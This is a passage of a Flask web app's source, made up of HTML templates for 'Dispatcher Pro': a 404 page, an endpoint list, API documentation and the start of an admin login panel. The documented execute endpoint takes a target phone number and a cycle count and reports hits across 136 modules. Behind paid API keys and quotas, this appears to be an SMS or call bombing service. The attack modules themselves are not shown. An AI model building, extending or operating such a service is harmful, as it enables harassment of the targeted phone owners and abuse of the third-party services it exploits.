.btn-tg{background:linear-gradient(135deg,#2ca5e0,#229ed9);color:#fff;box-shadow:0 4px 20px #2ca5e028}
.btn-tg:hover{transform:translateY(-2px);box-shadow:0 8px 28px #2ca5e045}
.btn-home{background:var(--card);color:var(--muted);border:1px solid var(--border)}
.btn-home:hover{border-color:var(--accent);color:var(--accent);transform:translateY(-2px)}
@keyframes up{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
.spark{position:fixed;width:3px;height:3px;border-radius:50%;background:var(--accent);pointer-events:none;opacity:.5;animation:fl var(--d) ease-in-out infinite var(--dl)}
@keyframes fl{0%,100%{transform:translate(0,0) scale(1);opacity:.3}50%{transform:translate(var(--x),var(--y)) scale(1.5);opacity:.8}}
</style></head><body>
<div class="spark" style="top:15%;left:10%;--d:5s;--dl:-1s;--x:20px;--y:-30px"></div>
<div class="spark" style="top:70%;left:85%;--d:7s;--dl:-3s;--x:-25px;--y:20px;background:#f76a6a"></div>
<div class="spark" style="top:40%;left:92%;--d:6s;--dl:-2s;--x:-15px;--y:-25px"></div>
<div class="spark" style="top:80%;left:15%;--d:8s;--dl:-4s;--x:30px;--y:-20px;background:#f76a6a"></div>
<div class="wrap">
  <div class="logo"><div class="dot"></div>JubairSensei API</div>
  <svg class="illo" viewBox="0 0 220 190" fill="none" xmlns="http://www.w3.org/2000/svg">
    <ellipse cx="110" cy="178" rx="65" ry="7" fill="#7c6af710"/>
    <rect x="88" y="90" width="34" height="46" rx="9" fill="#1e1e3a" stroke="#3a3a5c" stroke-width="1.5"/>
    <circle cx="105" cy="76" r="19" fill="#2a2a45" stroke="#3a3a5c" stroke-width="1.5"/>
    <path d="M87 70 Q93 57 105 57 Q117 57 123 70 Q117 59 105 59 Q93 59 87 70Z" fill="#7c6af7"/>
    <path d="M98 75 Q101 78 104 75" stroke="#0c0c0f" stroke-width="1.5" stroke-linecap="round" fill="none"/>
    <path d="M111 75 Q114 78 117 75" stroke="#0c0c0f" stroke-width="1.5" stroke-linecap="round" fill="none"/>
    <path d="M101 83 Q105 80 109 83" stroke="#6b6b8a" stroke-width="1.5" stroke-linecap="round" fill="none"/>
    <path d="M88 133 Q76 140 63 146 Q58 150 66 153 Q76 146 88 140Z" fill="#1e1e3a" stroke="#3a3a5c" stroke-width="1.5"/>
    <path d="M122 133 Q134 140 147 146 Q152 150 144 153 Q134 146 122 140Z" fill="#1e1e3a" stroke="#3a3a5c" stroke-width="1.5"/>
    <ellipse cx="64" cy="153" rx="9" ry="5" fill="#16162a" stroke="#3a3a5c" stroke-width="1.2"/>
    <ellipse cx="146" cy="153" rx="9" ry="5" fill="#16162a" stroke="#3a3a5c" stroke-width="1.2"/>
    <path d="M90 104 Q72 112 58 120" stroke="#3a3a5c" stroke-width="8" stroke-linecap="round"/>
    <circle cx="55" cy="122" r="6" fill="#2a2a45" stroke="#3a3a5c" stroke-width="1.5"/>
    <path d="M120 104 Q138 112 152 120" stroke="#3a3a5c" stroke-width="8" stroke-linecap="round"/>
    <circle cx="155" cy="122" r="6" fill="#2a2a45" stroke="#3a3a5c" stroke-width="1.5"/>
    <path d="M55 122 Q34 113 14 117 Q4 120 2 130" stroke="#4a4a6a" stroke-width="2.5" stroke-linecap="round" fill="none"/>
    <path d="M55 122 L50 115" stroke="#f76a6a" stroke-width="1.8" stroke-linecap="round"/>
    <path d="M55 122 L48 120" stroke="#fbbf24" stroke-width="1.8" stroke-linecap="round"/>
    <path d="M55 122 L51 127" stroke="#7c6af7" stroke-width="1.8" stroke-linecap="round"/>
    <path d="M155 122 Q176 113 196 117 Q206 120 208 130" stroke="#4a4a6a" stroke-width="2.5" stroke-linecap="round" fill="none"/>
    <path d="M155 122 L160 115" stroke="#f76a6a" stroke-width="1.8" stroke-linecap="round"/>
    <path d="M155 122 L162 120" stroke="#fbbf24" stroke-width="1.8" stroke-linecap="round"/>
    <path d="M155 122 L159 127" stroke="#7c6af7" stroke-width="1.8" stroke-linecap="round"/>
    <circle cx="55" cy="122" r="3.5" fill="#f76a6a" opacity=".8"><animate attributeName="opacity" values=".8;.2;.8" dur="1.2s" repeatCount="indefinite"/><animate attributeName="r" values="3.5;5.5;3.5" dur="1.2s" repeatCount="indefinite"/></circle>
    <circle cx="155" cy="122" r="3.5" fill="#f76a6a" opacity=".8"><animate attributeName="opacity" values=".2;.8;.2" dur="1.2s" repeatCount="indefinite"/><animate attributeName="r" values="5.5;3.5;5.5" dur="1.2s" repeatCount="indefinite"/></circle>
    <text x="122" y="62" font-family="Space Mono" font-size="10" fill="#7c6af7" opacity=".4"><animate attributeName="opacity" values=".4;.1;.4" dur="2.5s" repeatCount="indefinite"/>z</text>
    <text x="130" y="51" font-family="Space Mono" font-size="13" fill="#7c6af7" opacity=".3"><animate attributeName="opacity" values=".3;.1;.3" dur="3s" repeatCount="indefinite"/>z</text>
  </svg>
  <div class="code">{{ code }}</div>
  <div class="title">{{ msg }}</div>
  <p class="sub">এই পেজটা খুঁজে পাওয়া যাচ্ছে না।<br>হয়তো route টা ছিঁড়ে গেছে।</p>
  <div class="wire"></div>
  <div class="btns">
    <a href="https://t.me/jubairsensei" target="_blank" class="btn btn-tg">
      <svg width="15" height="15" viewBox="0 0 24 24" fill="white"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12L8.32 13.617l-2.96-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.828.942z"/></svg>
      Join Telegram
    </a>
    <a href="/" class="btn btn-home">⌂ Go Home</a>
  </div>
</div>
</body></html>"""


# ==================== হোম পেজ ====================
@app.route('/help')
def home():
    sr = round(STATS["total_success"] / STATS["total_requests"] * 100, 1) if STATS["total_requests"] > 0 else 0
    return render_template_string(_HOME_HTML, total_apis=len(APIS), total_req=STATS["total_requests"], sr=sr)

_HOME_HTML = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Dispatcher Pro — API</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Syne:wght@700;800&display=swap" rel="stylesheet">
<style>
:root{--bg:#080810;--card:#0f0f1a;--border:#1a1a2e;--accent:#6366f1;--cyan:#22d3ee;--green:#4ade80;--text:#e2e8f0;--muted:#475569;--mono:'JetBrains Mono',monospace}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;padding:24px 16px}
body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(#1a1a2e 1px,transparent 1px),linear-gradient(90deg,#1a1a2e 1px,transparent 1px);background-size:36px 36px;opacity:.5;pointer-events:none;z-index:0}
.wrap{position:relative;z-index:1;max-width:760px;margin:0 auto}
.header{display:flex;align-items:center;justify-content:space-between;margin-bottom:36px;padding-bottom:20px;border-bottom:1px solid var(--border);flex-wrap:wrap;gap:12px}
.brand{font-family:'Syne',sans-serif;font-size:18px;font-weight:800;color:var(--text)}
.brand span{color:var(--accent)}
.badge{display:flex;align-items:center;gap:6px;background:rgba(74,222,128,.08);border:1px solid rgba(74,222,128,.2);padding:5px 12px;border-radius:20px;font-size:10px;color:var(--green)}
.badge-dot{width:5px;height:5px;border-radius:50%;background:var(--green);box-shadow:0 0 5px var(--green);animation:blink 2s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:28px}
.stat{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;text-align:center}
.stat-val{font-family:'Syne',sans-serif;font-size:22px;font-weight:800;color:var(--accent);margin-bottom:4px}
.stat-lbl{font-size:10px;color:var(--muted);letter-spacing:.08em;text-transform:uppercase}
h2{font-family:'Syne',sans-serif;font-size:13px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);margin-bottom:12px;margin-top:28px;padding-bottom:8px;border-bottom:1px solid var(--border)}
.ep{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px 16px;margin-bottom:8px;display:flex;align-items:flex-start;gap:12px;flex-wrap:wrap}
.m{font-size:9px;font-weight:700;padding:3px 8px;border-radius:4px;flex-shrink:0;margin-top:2px}
.G{background:rgba(34,211,238,.1);color:var(--cyan);border:1px solid rgba(34,211,238,.2)}
.P{background:rgba(74,222,128,.1);color:var(--green);border:1px solid rgba(74,222,128,.2)}
.ep-info{flex:1}
.ep-path{font-size:13px;color:var(--cyan);margin-bottom:3px}
.ep-desc{font-size:11px;color:var(--muted)}
.ep-auth{font-size:9px;padding:2px 7px;border-radius:10px;font-weight:600;flex-shrink:0;margin-top:2px}
.a-api{background:rgba(99,102,241,.12);color:#818cf8;border:1px solid rgba(99,102,241,.2)}
.a-adm{background:rgba(251,146,60,.12);color:#fb923c;border:1px solid rgba(251,146,60,.2)}
.a-no{background:rgba(100,116,139,.1);color:var(--muted);border:1px solid rgba(100,116,139,.2)}
.footer{margin-top:36px;padding-top:20px;border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:11px;color:var(--muted)}
.footer a{color:var(--accent);text-decoration:none}
@media(max-width:480px){.stats{grid-template-columns:repeat(2,1fr)}.header{flex-direction:column;align-items:flex-start}}
</style></head><body>
<div class="wrap">
  <div class="header">
    <div class="brand">◈ Dispatcher<span>Pro</span></div>
    <div class="badge"><div class="badge-dot"></div>API Online</div>
  </div>
  <div class="stats">
    <div class="stat"><div class="stat-val">{{ total_apis }}</div><div class="stat-lbl">Modules</div></div>
    <div class="stat"><div class="stat-val">{{ total_req }}</div><div class="stat-lbl">Total Requests</div></div>
    <div class="stat"><div class="stat-val">{{ sr }}%</div><div class="stat-lbl">Success Rate</div></div>
  </div>
  <h2>Public Endpoints</h2>
  <div class="ep"><span class="m G">GET</span><span class="m P">POST</span><div class="ep-info"><div class="ep-path">/api/v1/execute</div><div class="ep-desc">Run dispatcher — params: target, amount</div></div><span class="ep-auth a-api">API Key</span></div>
  <div class="ep"><span class="m G">GET</span><div class="ep-info"><div class="ep-path">/api/status</div><div class="ep-desc">Check key quota & expiry</div></div><span class="ep-auth a-api">API Key</span></div>
  <div class="ep"><span class="m G">GET</span><div class="ep-info"><div class="ep-path">/api/list</div><div class="ep-desc">List all loaded modules</div></div><span class="ep-auth a-api">API Key</span></div>
  <div class="ep"><span class="m G">GET</span><div class="ep-info"><div class="ep-path">/api/stats</div><div class="ep-desc">Global success/fail statistics</div></div><span class="ep-auth a-api">API Key</span></div>
  <h2>Admin Endpoints</h2>
  <div class="ep"><span class="m G">GET</span><div class="ep-info"><div class="ep-path">/admin/api/keys</div><div class="ep-desc">List all API keys</div></div><span class="ep-auth a-adm">X-Admin-Token</span></div>
  <div class="ep"><span class="m P">POST</span><div class="ep-info"><div class="ep-path">/admin/api/keys/add</div><div class="ep-desc">Create new key — body: {key, limit, expires}</div></div><span class="ep-auth a-adm">X-Admin-Token</span></div>
  <div class="ep"><span class="m P">POST</span><div class="ep-info"><div class="ep-path">/admin/api/keys/remove</div><div class="ep-desc">Revoke key — body: {key}</div></div><span class="ep-auth a-adm">X-Admin-Token</span></div>
  <div class="ep"><span class="m P">POST</span><div class="ep-info"><div class="ep-path">/admin/api/keys/update</div><div class="ep-desc">Update key — body: {key, daily_limit, expires}</div></div><span class="ep-auth a-adm">X-Admin-Token</span></div>
  <div class="ep"><span class="m P">POST</span><div class="ep-info"><div class="ep-path">/admin/reset</div><div class="ep-desc">Reset global stats to zero</div></div><span class="ep-auth a-adm">X-Admin-Token</span></div>
  <div class="ep"><span class="m P">POST</span><div class="ep-info"><div class="ep-path">/admin/reset_daily</div><div class="ep-desc">Reset all keys' daily usage</div></div><span class="ep-auth a-adm">X-Admin-Token</span></div>
  <h2>UI</h2>
  <div class="ep"><span class="m G">GET</span><div class="ep-info"><div class="ep-path">/admin/login</div><div class="ep-desc">Admin dashboard GUI panel</div></div><span class="ep-auth a-no">Browser</span></div>
  <div class="ep"><span class="m G">GET</span><div class="ep-info"><div class="ep-path">/docs</div><div class="ep-desc">Full API documentation page</div></div><span class="ep-auth a-no">Public</span></div>
  <div class="footer">
    <span>Developer: <a href="https://t.me/jubairsensei" target="_blank">@JubairZ</a></span>
    <span>v2.0 · 2026</span>
  </div>
</div>
</body></html>"""


# ==================== এডমিন GUI ====================
@app.route('/docs')
def docs_page():
    return render_template_string(_DOCS_HTML)

_DOCS_HTML = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>API Docs — Dispatcher Pro</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@700;800&display=swap" rel="stylesheet">
<style>
:root{--bg:#080810;--sf:#0f0f1a;--card:#13131f;--bd:#1c1c2e;--ac:#6366f1;--cy:#22d3ee;--gr:#4ade80;--or:#fb923c;--re:#f87171;--ye:#fbbf24;--tx:#e2e8f0;--mu:#64748b;--mo:'JetBrains Mono',monospace}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--tx);font-family:var(--mo);min-height:100vh}
::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:var(--bd)}
.lay{display:flex;min-height:100vh}
.sb{width:220px;flex-shrink:0;background:var(--sf);border-right:1px solid var(--bd);padding:18px 0;position:sticky;top:0;height:100vh;overflow-y:auto}
.sb-lo{padding:0 14px 14px;border-bottom:1px solid var(--bd);margin-bottom:10px}
.sb-br{font-family:'Syne',sans-serif;font-size:13px;font-weight:800;color:var(--ac)}
.sb-vr{font-size:9px;color:var(--mu);margin-top:2px}
.sb-sc{padding:8px 14px 3px;font-size:8px;font-weight:700;letter-spacing:.15em;color:var(--mu);text-transform:uppercase}
.sb-a{display:flex;align-items:center;gap:6px;padding:7px 14px;font-size:10px;color:var(--mu);text-decoration:none;border-left:2px solid transparent;transition:all .15s}
.sb-a:hover,.sb-a.on{color:var(--tx);border-left-color:var(--ac);background:rgba(99,102,241,.06)}
.mb{font-size:8px;font-weight:700;padding:1px 4px;border-radius:3px;flex-shrink:0}
.main{flex:1;padding:32px 28px;max-width:820px;overflow-x:hidden}
.ph{margin-bottom:32px;padding-bottom:24px;border-bottom:1px solid var(--bd)}
.ph h1{font-family:'Syne',sans-serif;font-size:clamp(18px,4vw,26px);font-weight:800;margin-bottom:5px}
.ph h1 span{color:var(--ac)}
.ph p{font-size:11px;color:var(--mu)}
.pills{display:flex;gap:10px;margin-top:14px;flex-wrap:wrap}
.pill{display:flex;align-items:center;gap:4px;background:var(--card);border:1px solid var(--bd);padding:4px 10px;border-radius:20px;font-size:9px}
.dg{width:5px;height:5px;border-radius:50%;background:var(--gr);box-shadow:0 0 5px var(--gr);animation:bl 2s infinite}
@keyframes bl{0%,100%{opacity:1}50%{opacity:.2}}
.bub{background:var(--card);border:1px solid var(--bd);border-radius:9px;padding:12px 16px;margin-bottom:24px}
.bub .lb{font-size:8px;color:var(--mu);letter-spacing:.1em;text-transform:uppercase}
.bub .ul{font-size:11px;color:var(--cy)}
.ab{background:rgba(99,102,241,.05);border:1px solid rgba(99,102,241,.2);border-radius:9px;padding:12px 16px;margin-bottom:22px;font-size:10px}
.ab h4{color:var(--ac);font-size:10px;margin-bottom:6px}
.ab p{color:var(--mu);margin-bottom:4px;line-height:1.7}
.ab code{background:rgba(99,102,241,.12);color:var(--cy);padding:1px 5px;border-radius:3px;font-size:9px}
.st{font-family:'Syne',sans-serif;font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--mu);margin-bottom:10px;margin-top:26px;padding-bottom:6px;border-bottom:1px solid var(--bd)}
.ep{background:var(--card);border:1px solid var(--bd);border-radius:10px;margin-bottom:10px;overflow:hidden}
.eph{display:flex;align-items:center;gap:8px;padding:12px 16px;cursor:pointer;user-select:none;flex-wrap:wrap}
.mt{font-size:8px;font-weight:700;padding:2px 7px;border-radius:3px;letter-spacing:.05em;flex-shrink:0}
.GET{background:rgba(34,211,238,.1);color:var(--cy);border:1px solid rgba(34,211,238,.2)}
.POST{background:rgba(74,222,128,.1);color:var(--gr);border:1px solid rgba(74,222,128,.2)}
.ep-p{font-size:11px;flex:1}
.ep-p .rt{color:var(--cy)}
.ep-d{font-size:9px;color:var(--mu)}
.at{font-size:8px;padding:2px 6px;border-radius:10px;font-weight:600;flex-shrink:0}
.at-a{background:rgba(99,102,241,.15);color:var(--ac);border:1px solid rgba(99,102,241,.25)}
.at-d{background:rgba(251,146,60,.15);color:var(--or);border:1px solid rgba(251,146,60,.25)}
.at-n{background:rgba(100,116,139,.1);color:var(--mu);border:1px solid rgba(100,116,139,.2)}
.epb{display:none;padding:0 16px 16px;border-top:1px solid var(--bd)}
.epb.op{display:block}
.pt{width:100%;border-collapse:collapse;margin-top:10px;font-size:10px}
.pt th{text-align:left;padding:6px 8px;color:var(--mu);font-size:8px;letter-spacing:.08em;text-transform:uppercase;background:rgba(255,255,255,.02);border-bottom:1px solid var(--bd)}
.pt td{padding:7px 8px;border-bottom:1px solid rgba(255,255,255,.03);vertical-align:top}
.pt tr:last-child td{border-bottom:none}
.pn{color:var(--cy);font-weight:600}
.pty{color:var(--ye);font-size:9px}
.pr{color:var(--re);font-size:9px}
.po{color:var(--mu);font-size:9px}
.cb{background:#0a0a14;border:1px solid var(--bd);border-radius:7px;padding:10px 12px;margin-top:8px;font-size:9px;overflow-x:auto;white-space:pre;color:#a5b4fc}
.cb .cm{color:var(--mu)}.cb .k{color:var(--cy)}.cb .v{color:var(--gr)}.cb .s{color:#fca5a5}
.cl{font-size:8px;color:var(--mu);letter-spacing:.1em;text-transform:uppercase;margin-top:10px;margin-bottom:2px}
.cv{color:var(--mu);font-size:10px;transition:transform .2s;flex-shrink:0}
.cv.op{transform:rotate(180deg)}
.mob{display:none;position:fixed;bottom:18px;right:18px;background:var(--ac);border:none;border-radius:50%;width:42px;height:42px;font-size:17px;cursor:pointer;z-index:100;box-shadow:0 4px 20px rgba(99,102,241,.4);color:#fff;align-items:center;justify-content:center}
@media(max-width:700px){.sb{position:fixed;left:-220px;top:0;z-index:50;transition:left .3s;height:100vh}.sb.op{left:0}.mob{display:flex}.main{padding:18px 12px}.ep-d{display:none}.lay{flex-direction:column}}
</style></head><body>
<div class="lay">
<aside class="sb" id="sb">
  <div class="sb-lo"><div class="sb-br">◈ DISPATCHER PRO</div><div class="sb-vr">API Reference v2.0</div></div>
  <div class="sb-sc">Public</div>
  <a class="sb-a on" href="#ex"><span class="mb GET">GET</span>/api/v1/execute</a>
  <a class="sb-a" href="#st"><span class="mb GET">GET</span>/api/status</a>
  <a class="sb-a" href="#ls"><span class="mb GET">GET</span>/api/list</a>
  <a class="sb-a" href="#gs"><span class="mb GET">GET</span>/api/stats</a>
  <div class="sb-sc">Admin</div>
  <a class="sb-a" href="#ak"><span class="mb GET">GET</span>/admin/api/keys</a>
  <a class="sb-a" href="#aa"><span class="mb POST">POST</span>/admin/api/keys/add</a>
  <a class="sb-a" href="#ar"><span class="mb POST">POST</span>/admin/api/keys/remove</a>
  <a class="sb-a" href="#au"><span class="mb POST">POST</span>/admin/api/keys/update</a>
  <a class="sb-a" href="#rs"><span class="mb POST">POST</span>/admin/reset</a>
  <a class="sb-a" href="#rd"><span class="mb POST">POST</span>/admin/reset_daily</a>
  <div class="sb-sc">UI</div>
  <a class="sb-a" href="#lg"><span class="mb GET">GET</span>/admin/login</a>
</aside>
<main class="main">
  <div class="ph"><h1>API <span>Reference</span></h1><p>All available endpoints with parameters and examples.</p>
  <div class="pills"><div class="pill"><div class="dg"></div>Online</div><div class="pill">📡 136 Modules</div><div class="pill">🔐 Secured</div></div></div>
  <div class="bub"><div class="lb">Base URL</div><div class="ul">http://your-server:5000</div></div>
  <div class="ab"><h4>🔑 Authentication</h4>
  <p><strong>API:</strong> <code>?key=YOUR_KEY</code> or <code>X-API-Key</code> header</p>
  <p><strong>Admin:</strong> <code>X-Admin-Token: YOUR_PASSWORD</code> header</p></div>

  <div class="st">Public Endpoints</div>

  <div class="ep" id="ex"><div class="eph" onclick="t(this)"><span class="mt GET">GET</span><span class="mt POST">POST</span><span class="ep-p"><span class="rt">/api/v1/execute</span></span><span class="at at-a">API Key</span><span class="ep-d">Run dispatcher</span><span class="cv">▼</span></div>
  <div class="epb"><table class="pt"><thead><tr><th>Param</th><th>Type</th><th>Req</th><th>Info</th></tr></thead><tbody>
  <tr><td class="pn">key</td><td class="pty">string</td><td class="pr">Required</td><td>API key (query or header)</td></tr>
  <tr><td class="pn">target</td><td class="pty">string</td><td class="pr">Required</td><td>Phone number min 10 digits</td></tr>
  <tr><td class="pn">amount</td><td class="pty">integer</td><td class="po">Optional</td><td>Cycles to run (default: 1)</td></tr>
  </tbody></table>
  <div class="cl">Request</div><div class="cb">GET /api/v1/execute?key=demo_key&target=01700000000&amount=1</div>
  <div class="cl">Response</div><div class="cb">{<span class="k">"success"</span>:<span class="v">true</span>,<span class="k">"cycles"</span>:<span class="v">1</span>,<span class="k">"successful"</span>:<span class="v">120</span>,<span class="k">"failed"</span>:<span class="v">16</span>,<span class="k">"remaining_quota"</span>:<span class="v">4880</span>}</div>
  </div></div>

  <div class="ep" id="st"><div class="eph" onclick="t(this)"><span class="mt GET">GET</span><span class="ep-p"><span class="rt">/api/status</span></span><span class="at at-a">API Key</span><span class="ep-d">Key quota info</span><span class="cv">▼</span></div>
  <div class="epb"><div class="cl">Response</div><div class="cb">{<span class="k">"used_today"</span>:<span class="v">120</span>,<span class="k">"daily_limit"</span>:<span class="v">5000</span>,<span class="k">"remaining"</span>:<span class="v">4880</span>,<span class="k">"expires_on"</span>:<span class="s">"2027-12-31"</span>}</div></div></div>

  <div class="ep" id="ls"><div class="eph" onclick="t(this)"><span class="mt GET">GET</span><span class="ep-p"><span class="rt">/api/list</span></span><span class="at at-a">API Key</span><span class="ep-d">Module list</span><span class="cv">▼</span></div>
  <div class="epb"><div class="cl">Response</div><div class="cb">{<span class="k">"total"</span>:<span class="v">136</span>,<span class="k">"apis"</span>:[{<span class="k">"index"</span>:<span class="v">0</span>,<span class="k">"name"</span>:<span class="s">"Module Alpha"</span>}]}</div></div></div>

  <div class="ep" id="gs"><div class="eph" onclick="t(this)"><span class="mt GET">GET</span><span class="ep-p"><span class="rt">/api/stats</span></span><span class="at at-a">API Key</span><span class="ep-d">Global stats</span><span class="cv">▼</span></div>
  <div class="epb"><div class="cl">Response</div><div class="cb">{<span class="k">"total_requests"</span>:<span class="v">58420</span>,<span class="k">"total_success"</span>:<span class="v">51200</span>,<span class="k">"success_rate"</span>:<span class="v">87.6</span>}</div></div></div>

  <div class="st">Admin Endpoints</div>

  <div class="ep" id="ak"><div class="eph" onclick="t(this)"><span class="mt GET">GET</span><span class="ep-p"><span class="rt">/admin/api/keys</span></span><span class="at at-d">Admin</span><span class="ep-d">List all keys</span><span class="cv">▼</span></div>
  <div class="epb"><div class="cl">Header</div><div class="cb">X-Admin-Token: your_master_password</div>
  <div class="cl">Response</div><div class="cb">{<span class="k">"keys"</span>:[{<span class="k">"key"</span>:<span class="s">"client_x"</span>,<span class="k">"daily_limit"</span>:<span class="v">1000</span>,<span class="k">"requests_today"</span>:<span class="v">42</span>}]}</div></div></div>

  <div class="ep" id="aa"><div class="eph" onclick="t(this)"><span class="mt POST">POST</span><span class="ep-p"><span class="rt">/admin/api/keys/add</span></span><span class="at at-d">Admin</span><span class="ep-d">Create key</span><span class="cv">▼</span></div>
  <div class="epb"><table class="pt"><thead><tr><th>Field</th><th>Type</th><th>Req</th><th>Info</th></tr></thead><tbody>
  <tr><td class="pn">key</td><td class="pty">string</td><td class="pr">Required</td><td>Unique key name</td></tr>
  <tr><td class="pn">limit</td><td class="pty">integer</td><td class="po">Optional</td><td>Daily limit (default: 1000)</td></tr>
  <tr><td class="pn">expires</td><td class="pty">string</td><td class="po">Optional</td><td>YYYY-MM-DD</td></tr>
  </tbody></table>
  <div class="cl">Body</div><div class="cb">{<span class="k">"key"</span>:<span class="s">"new_client"</span>,<span class="k">"limit"</span>:<span class="v">5000</span>,<span class="k">"expires"</span>:<span class="s">"2027-12-31"</span>}</div></div></div>

  <div class="ep" id="ar"><div class="eph" onclick="t(this)"><span class="mt POST">POST</span><span class="ep-p"><span class="rt">/admin/api/keys/remove</span></span><span class="at at-d">Admin</span><span class="ep-d">Revoke key</span><span class="cv">▼</span></div>
  <div class="epb"><div class="cl">Body</div><div class="cb">{<span class="k">"key"</span>:<span class="s">"client_to_remove"</span>}</div></div></div>

  <div class="ep" id="au"><div class="eph" onclick="t(this)"><span class="mt POST">POST</span><span class="ep-p"><span class="rt">/admin/api/keys/update</span></span><span class="at at-d">Admin</span><span class="ep-d">Update key</span><span class="cv">▼</span></div>
  <div class="epb"><div class="cl">Body</div><div class="cb">{<span class="k">"key"</span>:<span class="s">"client_x"</span>,<span class="k">"daily_limit"</span>:<span class="v">9999</span>,<span class="k">"expires"</span>:<span class="s">"2028-01-01"</span>}</div></div></div>

  <div class="ep" id="rs"><div class="eph" onclick="t(this)"><span class="mt POST">POST</span><span class="ep-p"><span class="rt">/admin/reset</span></span><span class="at at-d">Admin</span><span class="ep-d">Reset global stats</span><span class="cv">▼</span></div>
  <div class="epb"><div class="cl">Response</div><div class="cb">{<span class="k">"success"</span>:<span class="v">true</span>,<span class="k">"message"</span>:<span class="s">"Statistics reset successfully"</span>}</div></div></div>

  <div class="ep" id="rd"><div class="eph" onclick="t(this)"><span class="mt POST">POST</span><span class="ep-p"><span class="rt">/admin/reset_daily</span></span><span class="at at-d">Admin</span><span class="ep-d">Reset daily quotas</span><span class="cv">▼</span></div>
  <div class="epb"><div class="cl">Response</div><div class="cb">{<span class="k">"success"</span>:<span class="v">true</span>,<span class="k">"message"</span>:<span class="s">"All daily limits reset"</span>}</div></div></div>

  <div class="st">UI Routes</div>
  <div class="ep" id="lg"><div class="eph" onclick="t(this)"><span class="mt GET">GET</span><span class="ep-p"><span class="rt">/admin/login</span></span><span class="at at-n">Browser</span><span class="ep-d">Admin GUI</span><span class="cv">▼</span></div>
  <div class="epb"><p style="font-size:10px;color:var(--mu);padding-top:6px">Browser admin panel. Enter master password. Token saved in localStorage.</p></div></div>
</main>
</div>
<button class="mob" onclick="document.getElementById('sb').classList.toggle('op')">☰</button>
<script>
function t(h){const b=h.nextElementSibling,c=h.querySelector('.cv');b.classList.toggle('op');c.classList.toggle('op')}
document.querySelectorAll('.sb-a').forEach(l=>l.addEventListener('click',function(){document.querySelectorAll('.sb-a').forEach(x=>x.classList.remove('on'));this.classList.add('on')}));
document.querySelector('.eph').click();
</script>
</body></html>"""


# ==================== এডমিন LOGIN GUI ====================
@app.route('/admin/login')
def admin_gui():
    return render_template_string(_ADMIN_HTML)

_ADMIN_HTML = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Admin Panel</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Syne:wght@700;800&display=swap" rel="stylesheet">
<style>
:root{--bg:#080810;--sf:#0d0d1a;--card:#111120;--bd:#1e1e32;--ac:#6366f1;--cy:#22d3ee;--gr:#4ade80;--re:#f87171;--or:#fb923c;--tx:#e2e8f0;--mu:#475569;--mo:'JetBrains Mono',monospace}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--tx);font-family:var(--mo);min-height:100vh}
body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(#1a1a2e 1px,transparent 1px),linear-gradient(90deg,#1a1a2e 1px,transparent 1px);background-size:32px 32px;opacity:.4;pointer-events:none}

/* ===== LOGIN ===== */
#login{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;z-index:50;padding:20px}
.login-box{background:var(--sf);border:1px solid var(--bd);border-radius:16px;padding:36px 28px;width:100%;max-width:360px;text-align:center;position:relative;box-shadow:0 20px 60px #00000060}
.login-box::before{content:'';position:absolute;inset:0;border-radius:16px;background:linear-gradient(135deg,rgba(99,102,241,.08),transparent);pointer-events:none}
.login-logo{font-family:'Syne',sans-serif;font-size:20px;font-weight:800;color:var(--tx);margin-bottom:4px}
.login-logo span{color:var(--ac)}
.login-sub{font-size:10px;color:var(--mu);margin-bottom:28px;letter-spacing:.05em}
.inp{width:100%;padding:12px 14px;border-radius:8px;border:1px solid var(--bd);background:#0a0a18;color:var(--tx);font-family:var(--mo);font-size:12px;outline:none;transition:border-color .2s;margin-bottom:12px}
.inp:focus{border-color:var(--ac)}
.inp::placeholder{color:var(--mu)}
.btn-login{width:100%;padding:12px;border-radius:8px;border:none;background:linear-gradient(135deg,var(--ac),#818cf8);color:#fff;font-family:var(--mo);font-size:12px;font-weight:600;cursor:pointer;transition:all .2s;letter-spacing:.04em}
.btn-login:hover{opacity:.9;transform:translateY(-1px)}
.btn-login:active{transform:translateY(0)}
.err{color:var(--re);font-size:11px;margin-top:10px;display:none}

/* ===== DASHBOARD ===== */
#dash{display:none;min-height:100vh}
.topbar{background:var(--sf);border-bottom:1px solid var(--bd);padding:14px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:10}
.tb-brand{font-family:'Syne',sans-serif;font-size:14px;font-weight:800}
.tb-brand span{color:var(--ac)}
.tb-right{display:flex;align-items:center;gap:10px}
